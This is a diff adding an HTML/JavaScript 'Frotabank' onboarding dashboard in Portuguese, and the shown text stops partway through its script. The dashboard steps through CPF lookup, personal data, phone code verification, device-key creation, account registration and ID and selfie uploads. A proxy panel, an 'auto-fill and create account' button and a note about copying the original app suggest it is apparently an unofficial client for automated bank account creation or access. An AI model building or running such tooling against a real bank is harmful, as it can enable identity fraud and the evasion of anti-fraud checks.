@@ -1,0 +1,1140 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Frotabank - Onboarding Dashboard</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0a0e17;--bg2:#111827;--bg3:#1a2236;--bg4:#243049;
+  --text:#e5e7eb;--text2:#9ca3af;--text3:#6b7280;
+  --accent:#10b981;--accent2:#059669;--accent-glow:rgba(16,185,129,.15);
+  --danger:#ef4444;--warn:#f59e0b;--info:#3b82f6;
+  --border:#1f2937;--border2:#374151;
+  --radius:12px;--radius-sm:8px;
+}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
+.header{background:var(--bg2);border-bottom:1px solid var(--border);padding:16px 24px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
+.header h1{font-size:20px;font-weight:600;display:flex;align-items:center;gap:10px}
+.header h1 span{color:var(--accent)}
+.layout{display:grid;grid-template-columns:1fr 320px;gap:0;min-height:calc(100vh - 57px)}
+.main{padding:24px;overflow-y:auto;max-height:calc(100vh - 57px)}
+.sidebar{background:var(--bg2);border-left:1px solid var(--border);padding:16px;overflow-y:auto;max-height:calc(100vh - 57px)}
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:16px}
+.card-title{font-size:13px;font-weight:600;color:var(--text2);text-transform:uppercase;letter-spacing:.5px;margin-bottom:14px}
+.input-group{margin-bottom:10px}
+.input-group label{display:block;font-size:11px;color:var(--text3);margin-bottom:3px;font-weight:500;text-transform:uppercase;letter-spacing:.3px}
+.input-row{display:flex;gap:8px}
+.input-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.input-grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
+input,select{width:100%;padding:9px 12px;background:var(--bg);border:1px solid var(--border2);border-radius:var(--radius-sm);color:var(--text);font-size:13px;outline:none;transition:border .2s}
+input:focus,select:focus{border-color:var(--accent)}
+input::placeholder{color:var(--text3)}
+input.mono{font-family:'Cascadia Code','Fira Code',monospace;letter-spacing:1px}
+.btn{padding:9px 18px;border:none;border-radius:var(--radius-sm);font-size:13px;font-weight:600;cursor:pointer;transition:all .2s;display:inline-flex;align-items:center;gap:6px}
+.btn:disabled{opacity:.4;cursor:not-allowed}
+.btn-primary{background:var(--accent);color:#fff}
+.btn-primary:hover:not(:disabled){background:var(--accent2)}
+.btn-secondary{background:var(--bg3);color:var(--text);border:1px solid var(--border2)}
+.btn-secondary:hover:not(:disabled){background:var(--bg4)}
+.btn-sm{padding:6px 12px;font-size:12px}
+.btn-block{width:100%}
+.steps{display:flex;gap:3px;margin-bottom:20px;flex-wrap:wrap}
+.step{flex:1;text-align:center;padding:6px 2px;border-radius:var(--radius-sm);font-size:10px;font-weight:600;background:var(--bg3);color:var(--text3);transition:all .3s;min-width:60px}
+.step.active{background:var(--accent-glow);color:var(--accent);border:1px solid rgba(16,185,129,.3)}
+.step.done{background:rgba(16,185,129,.1);color:var(--accent)}
+.step.error{background:rgba(239,68,68,.1);color:var(--danger)}
+.step-num{font-size:14px;font-weight:700;display:block}
+.badge{font-size:11px;padding:3px 8px;border-radius:20px;font-weight:600;display:inline-block}
+.badge-ok{background:rgba(16,185,129,.15);color:var(--accent)}
+.badge-err{background:rgba(239,68,68,.15);color:var(--danger)}
+.badge-warn{background:rgba(245,158,11,.15);color:var(--warn)}
+.log-panel{font-family:'Cascadia Code','Fira Code',monospace;font-size:11px;max-height:100%;overflow-y:auto}
+.log-entry{padding:4px 0;border-bottom:1px solid rgba(255,255,255,.04);display:flex;gap:6px;line-height:1.4;align-items:flex-start}
+.log-time{color:var(--text3);flex-shrink:0;font-size:10px}
+.log-age{color:#64748b;flex-shrink:0;font-size:10px;min-width:30px}
+.log-tag{flex-shrink:0;font-size:9px;font-weight:700;padding:1px 5px;border-radius:3px;text-transform:uppercase;letter-spacing:.5px}
+.log-tag-CPF{background:rgba(59,130,246,.15);color:#60a5fa}
+.log-tag-PRE{background:rgba(168,85,247,.15);color:#c084fc}
+.log-tag-PHONE{background:rgba(34,197,94,.15);color:#4ade80}
+.log-tag-CODE{background:rgba(16,185,129,.15);color:var(--accent)}
+.log-tag-DATA{background:rgba(234,179,8,.15);color:#facc15}
+.log-tag-CEP{background:rgba(14,165,233,.15);color:#38bdf8}
+.log-tag-SETUP{background:rgba(99,102,241,.15);color:#a5b4fc}
+.log-tag-USER{background:rgba(239,68,68,.15);color:#f87171}
+.log-tag-UPLOAD{background:rgba(245,158,11,.15);color:#fbbf24}
+.log-tag-DK{background:rgba(236,72,153,.15);color:#f472b6}
+.log-tag-DOCS{background:rgba(251,146,60,.15);color:#fb923c}
+.log-tag-AUTH{background:rgba(239,68,68,.3);color:#fca5a5}
+.log-tag-LOGIN{background:rgba(16,185,129,.3);color:#6ee7b7}
+.log-tag-HTTP{background:rgba(107,114,128,.15);color:#9ca3af}
+.log-msg{word-break:break-word;flex:1}
+.log-msg.success{color:var(--accent)}
+.log-msg.error{color:var(--danger)}
+.log-msg.warn{color:var(--warn)}
+.log-msg.debug{color:#6b7280;opacity:.7}
+.log-filter{padding:6px 10px;margin-bottom:8px;background:var(--bg);border:1px solid var(--border2);border-radius:var(--radius-sm);display:flex;gap:6px;flex-wrap:wrap}
+.log-filter-btn{padding:3px 8px;font-size:10px;background:var(--bg3);color:var(--text2);border:none;border-radius:3px;cursor:pointer;font-weight:600}
+.log-filter-btn.active{background:var(--accent);color:#fff}
+.result-box{padding:10px;border-radius:var(--radius-sm);font-size:12px;font-family:monospace;margin-top:8px;word-break:break-all;max-height:200px;overflow-y:auto}
+.result-ok{background:rgba(16,185,129,.08);border:1px solid rgba(16,185,129,.2);color:var(--accent)}
+.result-err{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:var(--danger)}
+.section-hidden{display:none}
+.section-visible{display:block}
+.delivery-toggle{display:flex;border:1px solid var(--border2);border-radius:var(--radius-sm);overflow:hidden}
+.delivery-toggle button{flex:1;padding:8px 16px;background:var(--bg);color:var(--text2);border:none;font-size:13px;cursor:pointer;transition:all .2s}
+.delivery-toggle button.active{background:var(--accent);color:#fff}
+.file-upload{position:relative;border:2px dashed var(--border2);border-radius:var(--radius-sm);padding:16px;text-align:center;cursor:pointer;transition:all .2s;background:var(--bg)}
+.file-upload:hover{border-color:var(--accent);background:var(--accent-glow)}
+.file-upload.has-file{border-color:var(--accent);border-style:solid}
+.file-upload input[type=file]{position:absolute;inset:0;opacity:0;cursor:pointer}
+.file-upload .file-label{font-size:12px;color:var(--text2)}
+.file-upload .file-name{font-size:12px;color:var(--accent);font-weight:600;margin-top:4px}
+.file-upload .file-preview{max-width:80px;max-height:60px;margin:8px auto 0;border-radius:4px;display:none}
+.upload-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
+.spinner{display:inline-block;width:16px;height:16px;border:2px solid var(--text3);border-top-color:var(--accent);border-radius:50%;animation:spin .6s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.divider{border-top:1px solid var(--border);margin:12px 0;padding-top:12px}
+.section-label{font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px}
+.success-banner{background:rgba(16,185,129,.1);border:2px solid var(--accent);border-radius:var(--radius);padding:24px;text-align:center;margin-top:16px}
+.success-banner h2{color:var(--accent);font-size:18px;margin-bottom:8px}
+.success-banner p{color:var(--text2);font-size:13px}
+.auto-step{background:var(--bg3);border:1px solid var(--border2);border-radius:var(--radius-sm);padding:8px 12px;margin:4px 0;font-size:12px;display:flex;align-items:center;gap:8px}
+.auto-step .status{width:18px;height:18px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:10px;flex-shrink:0}
+.auto-step .status.pending{background:var(--bg4);color:var(--text3)}
+.auto-step .status.running{background:var(--warn);color:#000}
+.auto-step .status.ok{background:var(--accent);color:#fff}
+.auto-step .status.fail{background:var(--danger);color:#fff}
+@media(max-width:768px){
+  .layout{grid-template-columns:1fr}
+  .sidebar{border-left:none;border-top:1px solid var(--border);max-height:300px}
+  .upload-grid{grid-template-columns:1fr}
+  .input-grid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" stroke="#10b981"/></svg>
+    <span>Frotabank</span> Onboarding
+  </h1>
+  <div class="header-actions">
+    <button class="btn btn-secondary btn-sm" onclick="togglePanel('proxy-panel')">Proxy</button>
+    <button class="btn btn-secondary btn-sm" onclick="resetAll()">Reset</button>
+  </div>
+</div>
+
+<div id="proxy-panel" style="display:none;background:var(--bg2);border-bottom:1px solid var(--border);padding:12px 24px;">
+  <div style="max-width:1100px;margin:0 auto;display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
+    <label style="font-size:12px;opacity:.8;min-width:60px;">Proxy:</label>
+    <input id="proxy-input" type="text" placeholder="ip:porta:usuario:senha  (ou http://user:pass@ip:port)"
+      style="flex:1;min-width:300px;background:var(--bg);border:1px solid var(--border);color:#fff;padding:8px 10px;border-radius:6px;font-family:monospace;font-size:13px;" />
+    <button class="btn btn-secondary btn-sm" onclick="testProxy()">Testar</button>
+    <button class="btn btn-primary btn-sm" onclick="saveProxy()">Salvar</button>
+    <button class="btn btn-secondary btn-sm" onclick="clearProxy()">Limpar</button>
+    <span id="proxy-status" style="font-size:12px;opacity:.9;margin-left:8px;"></span>
+  </div>
+</div>
+
+<div class="layout">
+  <div class="main">
+    <div class="steps" id="steps">
+      <div class="step" data-step="0"><span class="step-num">1</span>CPF</div>
+      <div class="step" data-step="1"><span class="step-num">2</span>Dados</div>
+      <div class="step" data-step="2"><span class="step-num">3</span>Telefone</div>
+      <div class="step" data-step="3"><span class="step-num">4</span>Codigo</div>
+      <div class="step" data-step="4"><span class="step-num">5</span>Fotos</div>
+      <div class="step" data-step="5"><span class="step-num">6</span>Criar Conta</div>
+    </div>
+
+    <!-- Step 0: CPF -->
+    <div class="card" id="sec-cpf">
+      <div class="card-title">Consultar CPF</div>
+      <div class="input-row">
+        <input type="text" id="cpf-input" class="mono" placeholder="000.000.000-00" maxlength="14" oninput="formatCPF(this)">
+        <button class="btn btn-primary" id="btn-lookup" onclick="lookupCPF()">Consultar</button>
+      </div>
+      <div id="cpf-state" style="margin-top:8px"></div>
+    </div>
+
+    <!-- Login (has_account) -->
+    <div class="card section-hidden" id="sec-login">
+      <div class="card-title" style="color:var(--accent)">Acessar Conta</div>
+      <p style="color:var(--text2);font-size:12px;margin-bottom:14px">Conta ativa. Confirme seu telefone e senha para acessar.</p>
+      <div class="input-group">
+        <label>Senha de Acesso</label>
+        <div class="input-row">
+          <input type="password" id="login-password" placeholder="Sua senha">
+          <button class="btn btn-secondary btn-sm" onclick="togglePw('login-password',this)">Ver</button>
+        </div>
+      </div>
+      <div class="input-group">
+        <label>Telefone (com DDD)</label>
+        <input type="text" id="login-phone" class="mono" placeholder="11999999999" maxlength="11">
+      </div>
+      <div class="input-group">
+        <label>Enviar codigo via</label>
+        <div id="login-delivery-toggle" style="display:flex;gap:4px;margin-top:4px">
+          <button class="btn btn-secondary btn-sm active" data-method="whatsapp" onclick="setLoginDelivery(this)">WhatsApp</button>
+          <button class="btn btn-secondary btn-sm" data-method="sms" onclick="setLoginDelivery(this)">SMS</button>
+        </div>
+      </div>
+      <button class="btn btn-primary btn-block" id="btn-login-send" onclick="loginSendCode()" style="margin-top:8px">Enviar Codigo</button>
+      <div class="input-group section-hidden" id="login-code-group" style="margin-top:12px">
+        <label>Codigo de Verificacao</label>
+        <div class="input-row">
+          <input type="text" id="login-code" class="mono" placeholder="000000" maxlength="6">
+          <button class="btn btn-primary" id="btn-login-complete" onclick="loginComplete()">Entrar</button>
+        </div>
+      </div>
+      <div id="login-result"></div>
+    </div>
+
+    <!-- Create Credential (in_progress) -->
+    <div class="card section-hidden" id="sec-create-credential">
+      <div class="card-title" style="color:var(--warn)">Completar Cadastro</div>
+      <p style="color:var(--text2);font-size:12px;margin-bottom:14px">Cadastro incompleto. Crie sua senha e confirme com codigo.</p>
+      <div class="input-group">
+        <label>Nova Senha</label>
+        <input type="password" id="cred-password" placeholder="Minimo 8 caracteres">
+      </div>
+      <div class="input-group">
+        <label>Confirmar Senha</label>
+        <input type="password" id="cred-password-confirm" placeholder="Repita a senha">
+      </div>
+      <div class="divider"></div>
+      <div class="input-group">
+        <label>Telefone <span style="opacity:.6;font-size:11px">(opcional - backend busca pelo CPF)</span></label>
+        <input type="text" id="cred-phone" class="mono" placeholder="11999999999 (opcional)" maxlength="11">
+      </div>
+      <div class="input-group">
+        <label>Metodo de Envio</label>
+        <div class="input-row" style="gap:6px">
+          <button class="btn btn-primary btn-sm" id="cred-m-whatsapp" style="flex:1" onclick="setCredMethod('whatsapp')">WhatsApp</button>
+          <button class="btn btn-secondary btn-sm" id="cred-m-sms" style="flex:1" onclick="setCredMethod('sms')">SMS</button>
+          <button class="btn btn-secondary btn-sm" id="cred-m-call" style="flex:1" onclick="setCredMethod('phone-call')">Ligacao</button>
+        </div>
+      </div>
+      <button class="btn btn-secondary btn-block" id="btn-cred-send" onclick="sendCredCode()" style="margin-bottom:10px">Enviar Codigo</button>
+      <div class="input-group">
+        <label>Codigo de Verificacao</label>
+        <input type="text" id="cred-code" class="mono" placeholder="000000" maxlength="6">
+      </div>
+      <button class="btn btn-primary btn-block" id="btn-cred-submit" onclick="submitCredential()" style="margin-top:8px">Criar Senha e Entrar</button>
+      <div id="cred-result"></div>
+    </div>
+
+    <!-- Step 1: Dados Pessoais (ANTES do telefone - como no app original) -->
+    <div class="card section-hidden" id="sec-person">
+      <div class="card-title" style="display:flex;justify-content:space-between;align-items:center">
+        <span>Dados Pessoais</span>
+        <button type="button" class="btn btn-secondary btn-sm" onclick="autoFillAndSubmit()" style="font-size:11px">⚡ Auto-fill + Criar Conta</button>
+      </div>
+      <div id="session-timer" style="display:none;font-size:12px;padding:6px 10px;background:var(--bg);border-radius:var(--radius-sm);margin-bottom:10px;text-align:center"></div>
+      <div class="input-group">
+        <label>Nome Completo</label>
+        <input type="text" id="p-name" placeholder="NOME COMPLETO" style="text-transform:uppercase">
+      </div>
+      <div class="input-grid">
+        <div class="input-group">
+          <label>Data de Nascimento</label>
+          <input type="date" id="p-birthday">
+        </div>
+        <div class="input-group">
+          <label>Genero</label>
+          <select id="p-gender"><option value="">Selecione</option><option value="M">Masculino</option><option value="F">Feminino</option></select>
+        </div>
+      </div>
+      <div class="input-group">
+        <label>Nome da Mae</label>
+        <input type="text" id="p-mother" placeholder="NOME DA MAE" style="text-transform:uppercase">
+      </div>
+      <div class="input-group">
+        <label>Email</label>
+        <input type="email" id="p-email" placeholder="email@exemplo.com">
+      </div>
+      <div class="input-grid">
+        <div class="input-group">
+          <label>RG</label>
+          <input type="text" id="p-rg" class="mono" placeholder="000000000">
+        </div>
+        <div class="input-group">
+          <label>Data Emissao RG</label>
+          <input type="date" id="p-rg-date">
+        </div>
+      </div>
+      <div class="input-grid">
+        <div class="input-group">
+          <label>Renda Mensal (R$)</label>
+          <input type="text" id="p-income" value="R$ 5.000,00" oninput="maskBRL(this)" inputmode="numeric">
+        </div>
+        <div class="input-group">
+          <label>PEP?</label>
+          <select id="p-pep"><option value="false">Nao</option><option value="true">Sim</option></select>
+        </div>
+      </div>
+      <div class="divider"></div>
+      <div class="section-label">Endereco</div>
+      <div class="input-grid">
+        <div class="input-group">
+          <label>CEP</label>
+          <div class="input-row">
+            <input type="text" id="p-cep" class="mono" placeholder="00000-000" maxlength="9" oninput="formatCEP(this)">
+            <button class="btn btn-secondary btn-sm" onclick="lookupCEP()" id="btn-cep">Buscar</button>
+          </div>
+        </div>
+        <div class="input-group">
+          <label>Estado</label>
+          <input type="text" id="p-state" placeholder="PR" maxlength="2">
+        </div>
+      </div>
+      <div class="input-group">
+        <label>Rua</label>
+        <input type="text" id="p-street" placeholder="Rua...">
+      </div>
+      <div class="input-grid-3">
+        <div class="input-group">
+          <label>Numero</label>
+          <input type="text" id="p-number" placeholder="100">
+        </div>
+        <div class="input-group">
+          <label>Complemento</label>
+          <input type="text" id="p-complement" placeholder="Apto...">
+        </div>
+        <div class="input-group">
+          <label>Bairro</label>
+          <input type="text" id="p-neighborhood" placeholder="Centro">
+        </div>
+      </div>
+      <div class="input-group">
+        <label>Cidade</label>
+        <input type="text" id="p-city" placeholder="Curitiba">
+      </div>
+      <div class="divider"></div>
+      <div class="input-group">
+        <label>Senha de Acesso</label>
+        <div class="input-row">
+          <input type="password" id="p-password" placeholder="Minimo 8 caracteres">
+          <button type="button" class="btn btn-secondary btn-sm" onclick="togglePw('p-password', this)" style="flex-shrink:0">Ver</button>
+        </div>
+      </div>
+      <div class="input-group">
+        <label>Confirmar Senha</label>
+        <div class="input-row">
+          <input type="password" id="p-password-confirm" placeholder="Repita a senha">
+          <button type="button" class="btn btn-secondary btn-sm" onclick="togglePw('p-password-confirm', this)" style="flex-shrink:0">Ver</button>
+        </div>
+      </div>
+      <button class="btn btn-primary btn-block" onclick="savePerson()" style="margin-top:12px" id="btn-save-person">Salvar e Continuar</button>
+    </div>
+
+    <!-- Step 2: Telefone (depois dos dados) -->
+    <div class="card section-hidden" id="sec-phone">
+      <div class="card-title">Telefone para Verificacao</div>
+      <div class="input-group">
+        <label>Numero (DDD + telefone)</label>
+        <input type="text" id="phone-input" class="mono" placeholder="11999999999" maxlength="11">
+      </div>
+      <div class="input-group">
+        <label>Metodo de envio</label>
+        <div class="delivery-toggle" id="delivery-toggle">
+          <button class="active" data-method="whatsapp" onclick="setDelivery(this)">WhatsApp</button>
+          <button data-method="sms" onclick="setDelivery(this)">SMS</button>
+        </div>
+      </div>
+      <button class="btn btn-primary btn-block" id="btn-send-code" onclick="sendOnboardingCode()" style="margin-top:12px">Enviar Codigo</button>
+    </div>
+
+    <!-- Step 3: Codigo (ao verificar roda POST /user instantaneamente) -->
+    <div class="card section-hidden" id="sec-code">
+      <div class="card-title">Verificar Codigo</div>
+      <p style="color:var(--text2);font-size:12px;margin-bottom:10px">Ao digitar o codigo correto, a conta sera criada imediatamente.</p>
+      <div class="input-row">
+        <input type="text" id="code-input" class="mono" placeholder="000000" maxlength="6">
+        <button class="btn btn-primary" id="btn-verify" onclick="verifyCode()">Verificar e Criar Conta</button>
+      </div>
+    </div>
+
+    <!-- Step 4: Criar Conta (AUTOMATICO: setup + POST /user) -->
+    <div class="card section-hidden" id="sec-create">
+      <div class="card-title">Criar Conta</div>
+      <p style="color:var(--text2);font-size:12px;margin-bottom:14px">Clique para executar automaticamente: buscar termos, criar device key e registrar a conta.</p>
+      <button class="btn btn-primary btn-block" id="btn-create" onclick="runCreateAccount()">Criar Conta no Frotabank</button>
+      <div id="create-steps" style="margin-top:12px">
+        <div class="auto-step" id="as-terms"><div class="status pending">-</div>Buscar termos de uso</div>
+        <div class="auto-step" id="as-dk"><div class="status pending">-</div>Criar device key (SafeGuard)</div>
+        <div class="auto-step" id="as-user"><div class="status pending">-</div>Registrar usuario (POST /user)</div>
+      </div>
+      <div id="create-result"></div>
+    </div>
+
+    <!-- Step 5: Upload Fotos -->
+    <div class="card section-hidden" id="sec-upload">
+      <div class="card-title">Anexar Documentos</div>
+      <p style="color:var(--text2);font-size:12px;margin-bottom:10px">Tipo de documento:</p>
+      <div class="delivery-toggle" id="doc-type-toggle" style="margin-bottom:14px">
+        <button class="active" data-doctype="cnh-digital" onclick="setDocType(this)">CNH Digital (PDF)</button>
+        <button data-doctype="cnh-fisica" onclick="setDocType(this)">CNH Fisica</button>
+        <button data-doctype="rg" onclick="setDocType(this)">RG</button>
+      </div>
+      <div class="upload-grid" id="upload-grid-selfie">
+        <div>
+          <div class="section-label">Selfie</div>
+          <div class="file-upload" id="drop-selfie">
+            <input type="file" accept="image/*" onchange="onFileSelect(this, 'selfie')">
+            <div class="file-label">Clique ou arraste</div>
+            <div class="file-name" id="fn-selfie"></div>
+            <img class="file-preview" id="prev-selfie">
+          </div>
+          <button class="btn btn-sm" onclick="openCamera()" style="margin-top:6px;width:100%">Capturar com Camera</button>
+          <div id="camera-container" style="display:none;margin-top:8px">
+            <video id="camera-video" autoplay playsinline style="width:100%;max-width:320px;border-radius:8px;border:2px solid var(--brand)"></video>
+            <div style="margin-top:6px;display:flex;gap:8px">
+              <button class="btn btn-primary btn-sm" onclick="capturePhoto()" style="flex:1">Tirar Foto</button>
+              <button class="btn btn-sm" onclick="closeCamera()" style="flex:1">Fechar</button>
+            </div>
+            <canvas id="camera-canvas" style="display:none"></canvas>
+          </div>
+        </div>
+      </div>
+      <div id="docs-cnh-digital" style="margin-top:14px">
+        <div class="section-label">CNH Digital (PDF)</div>
+        <div class="file-upload" id="drop-cnhDigital">
+          <input type="file" accept="application/pdf,.pdf" onchange="onFileSelect(this, 'cnhDigital')">
+          <div class="file-label">Clique ou arraste o PDF da CNH Digital</div>
+          <div class="file-name" id="fn-cnhDigital"></div>
+        </div>
+      </div>
+      <div id="docs-cnh-fisica" class="section-hidden" style="margin-top:14px">
+        <div class="upload-grid">
+          <div>
+            <div class="section-label">CNH Frente</div>
+            <div class="file-upload" id="drop-cnhFront">
+              <input type="file" accept="image/*" onchange="onFileSelect(this, 'cnhFront')">
+              <div class="file-label">Clique ou arraste</div>
+              <div class="file-name" id="fn-cnhFront"></div>
+              <img class="file-preview" id="prev-cnhFront">
+            </div>
+          </div>
+          <div>
+            <div class="section-label">CNH Verso</div>
+            <div class="file-upload" id="drop-cnhBack">
+              <input type="file" accept="image/*" onchange="onFileSelect(this, 'cnhBack')">
+              <div class="file-label">Clique ou arraste</div>
+              <div class="file-name" id="fn-cnhBack"></div>
+              <img class="file-preview" id="prev-cnhBack">
+            </div>
+          </div>
+        </div>
+      </div>
+      <div id="docs-rg" class="section-hidden" style="margin-top:14px">
+        <div class="upload-grid">
+          <div>
+            <div class="section-label">RG Frente</div>
+            <div class="file-upload" id="drop-rgFront">
+              <input type="file" accept="image/*" onchange="onFileSelect(this, 'rgFront')">
+              <div class="file-label">Clique ou arraste</div>
+              <div class="file-name" id="fn-rgFront"></div>
+              <img class="file-preview" id="prev-rgFront">
+            </div>
+          </div>
+          <div>
+            <div class="section-label">RG Verso</div>
+            <div class="file-upload" id="drop-rgBack">
+              <input type="file" accept="image/*" onchange="onFileSelect(this, 'rgBack')">
+              <div class="file-label">Clique ou arraste</div>
+              <div class="file-name" id="fn-rgBack"></div>
+              <img class="file-preview" id="prev-rgBack">
+            </div>
+          </div>
+        </div>
+      </div>
+      <button class="btn btn-primary btn-block" id="btn-upload" onclick="runUpload()" style="margin-top:14px">Enviar Documentos</button>
+      <div id="upload-result"></div>
+    </div>
+
+    <!-- Step 6: Validar DK -->
+    <div class="card section-hidden" id="sec-validate">
+      <div class="card-title">Validar Device Key</div>
+      <button class="btn btn-primary btn-block" id="btn-validate-selfie" onclick="validateSelfie()" style="margin-bottom:8px">Validar via Selfie</button>
+      <div id="validate-selfie-result"></div>
+      <div id="sec-dk-code" class="section-hidden" style="margin-top:12px">
+        <div class="divider"></div>
+        <p style="color:var(--text2);font-size:12px;margin-bottom:8px">Selfie nao funcionou. Validar por codigo:</p>
+        <div class="delivery-toggle" id="dk-delivery-toggle" style="margin-bottom:8px">
+          <button class="active" data-method="whatsapp" onclick="setDKDelivery(this)">WhatsApp</button>
+          <button data-method="sms" onclick="setDKDelivery(this)">SMS</button>
+        </div>
+        <button class="btn btn-secondary btn-block btn-sm" id="btn-send-dk" onclick="sendDKCode()" style="margin-bottom:8px">Enviar Codigo DK</button>
+        <div class="input-row">
+          <input type="text" id="dk-code-input" class="mono" placeholder="Codigo" maxlength="6">
+          <button class="btn btn-primary btn-sm" id="btn-validate-dk" onclick="validateDKCode()">Validar</button>
+        </div>
+        <div id="validate-dk-result"></div>
+      </div>
+    </div>
+
+    <!-- Step 7: Send Documents -->
+    <div class="card section-hidden" id="sec-send-docs">
+      <div class="card-title">Enviar Documentos</div>
+      <button class="btn btn-primary btn-block" id="btn-send-docs" onclick="sendDocuments()">Enviar ao Frotabank</button>
+      <div id="send-docs-result"></div>
+    </div>
+
+    <div id="sec-success" class="section-hidden">
+      <div class="success-banner">
+        <h2>Cadastro Enviado!</h2>
+        <p>Documentos enviados para analise. Aguarde aprovacao.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="sidebar">
+    <div class="card-title" style="display:flex;justify-content:space-between;align-items:center">
+      <span>Log de Atividade</span>
+      <button id="log-filter-btn" class="log-filter-btn active" onclick="toggleLogFilter()">Mostrar: principal</button>
+    </div>
+    <div class="log-panel" id="log-panel"></div>
+  </div>
+</div>
+
+<script>
+let deliveryMethod = 'whatsapp';
+let dkDeliveryMethod = 'whatsapp';
+let selectedFiles = {};
+let savedPassword = '';
+
+function formatCPF(el) {
+  let v = el.value.replace(/\D/g,'');
+  if (v.length > 11) v = v.slice(0,11);
+  if (v.length > 9) v = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6,9)+'-'+v.slice(9);
+  else if (v.length > 6) v = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6);
+  else if (v.length > 3) v = v.slice(0,3)+'.'+v.slice(3);
+  el.value = v;
+}
+function formatCEP(el) {
+  let v = el.value.replace(/\D/g,'');
+  if (v.length > 8) v = v.slice(0,8);
+  if (v.length > 5) v = v.slice(0,5)+'-'+v.slice(5);
+  el.value = v;
+}
+function rawCPF() { return document.getElementById('cpf-input').value.replace(/\D/g,''); }
+
+function maskBRL(el) {
+  let v = el.value.replace(/\D/g,'');
+  if (!v) { el.value = ''; return; }
+  v = (parseInt(v,10)/100).toFixed(2);
+  el.value = 'R$ ' + v.replace('.',',').replace(/\B(?=(\d{3})+(?!\d))/g,'.');
+}
+function parseBRL(s) {
+  if (!s) return 0;
+  const digits = String(s).replace(/\D/g,'');
+  return digits ? Math.round(parseInt(digits,10)/100) : 0;
+}
+
+function setStep(n, status) {
+  document.querySelectorAll('.step').forEach((s,i) => {
+    s.classList.remove('active','done','error');
+    if (i < n) s.classList.add('done');
+    else if (i === n) s.classList.add(status || 'active');
+  });
+}
+function showSection(id) { const el = document.getElementById(id); if(el){el.classList.remove('section-hidden');el.classList.add('section-visible');} }
+function hideSection(id) { const el = document.getElementById(id); if(el){el.classList.remove('section-visible');el.classList.add('section-hidden');} }
+function hideAllSections() {
+  ['sec-login','sec-create-credential','sec-phone','sec-code','sec-person','sec-create','sec-upload','sec-validate','sec-send-docs','sec-success','login-code-group'].forEach(hideSection);
+}
+function setDelivery(btn) {
+  document.querySelectorAll('#delivery-toggle button').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active'); deliveryMethod = btn.dataset.method;
+}
+function setDKDelivery(btn) {
+  document.querySelectorAll('#dk-delivery-toggle button').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active'); dkDeliveryMethod = btn.dataset.method;
+}
+function addLog(msg, level='info') {
+  const panel = document.getElementById('log-panel');
+  const time = new Date().toLocaleTimeString('pt-BR',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
+  const div = document.createElement('div');
+  div.className = 'log-entry';
+  div.innerHTML = `<span class="log-time">${time}</span><span class="log-msg ${level}">${msg}</span>`;
+  panel.prepend(div);
+}
+function resultHTML(ok, msg) { return `<div class="result-box ${ok?'result-ok':'result-err'}">${msg}</div>`; }
+
+async function api(path, body=null) {
+  const opts = {method: body !== null ? 'POST' : 'GET', headers: {}};
+  if (body !== null) { opts.headers['Content-Type'] = 'application/json'; opts.body = JSON.stringify(body); }
+  try {
+    const r = await fetch(path, opts);
+    const text = await r.text();
+    try { return JSON.parse(text); } catch(e) { return {ok: false, msg: `${r.status}: ${text.slice(0,200)}`}; }
+  } catch(e) { return {ok: false, msg: `Erro de rede: ${e.message}`}; }
+}
+function loading(id, on=true) {
+  const btn = document.getElementById(id); if(!btn) return;
+  if (on) { btn._origText = btn.textContent; btn.innerHTML = '<span class="spinner"></span> Aguarde...'; btn.disabled = true; }
+  else { btn.textContent = btn._origText || 'OK'; btn.disabled = false; }
+}
+function onFileSelect(input, name) {
+  const file = input.files[0]; if (!file) return;
+  selectedFiles[name] = file;
+  document.getElementById('fn-'+name).textContent = file.name;
+  document.getElementById('drop-'+name).classList.add('has-file');
+  const prev = document.getElementById('prev-'+name);
+  const reader = new FileReader();
+  reader.onload = e => { prev.src = e.target.result; prev.style.display = 'block'; };
+  reader.readAsDataURL(file);
+}
+function getDateInputValue(id) {
+  const val = document.getElementById(id).value; if (!val) return '';
+  const [y,m,d] = val.split('-'); return `${d}/${m}/${y}`;
+}
+function setAutoStep(id, status, text) {
+  const el = document.querySelector(`#${id} .status`);
+  el.className = 'status ' + status;
+  el.textContent = status === 'ok' ? 'V' : status === 'fail' ? 'X' : status === 'running' ? '...' : '-';
+  if (text) { const span = el.parentElement.querySelector('.auto-label'); }
+}
+
+let cameraStream = null;
+function openCamera() {
+  const container = document.getElementById('camera-container');
+  const video = document.getElementById('camera-video');
+  container.style.display = 'block';
+  navigator.mediaDevices.getUserMedia({video: {facingMode: 'user', width: {ideal: 640}, height: {ideal: 480}}})
+    .then(stream => { cameraStream = stream; video.srcObject = stream; })
+    .catch(e => { addLog('Camera erro: ' + e.message, 'error'); container.style.display = 'none'; });
+}
+function capturePhoto() {
+  const video = document.getElementById('camera-video');
+  const canvas = document.getElementById('camera-canvas');
+  canvas.width = video.videoWidth; canvas.height = video.videoHeight;
